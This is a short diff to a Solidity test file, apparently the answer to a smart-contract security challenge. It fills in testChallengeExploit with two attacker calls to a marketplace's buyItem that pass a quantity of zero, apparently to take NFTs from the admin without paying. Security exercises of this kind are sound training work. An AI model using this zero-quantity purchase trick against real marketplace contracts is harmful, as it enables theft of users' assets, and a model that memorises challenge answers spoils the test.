@@ -71,7 +71,8 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        bonanzaMarketplace.buyItem({_nftAddress: address(nftA), _tokenId: 0, _owner: adminUser, _quantity: 0});
+        bonanzaMarketplace.buyItem({_nftAddress: address(nftB), _tokenId: 0, _owner: adminUser, _quantity: 0});
 
         vm.stopPrank();
         validation();
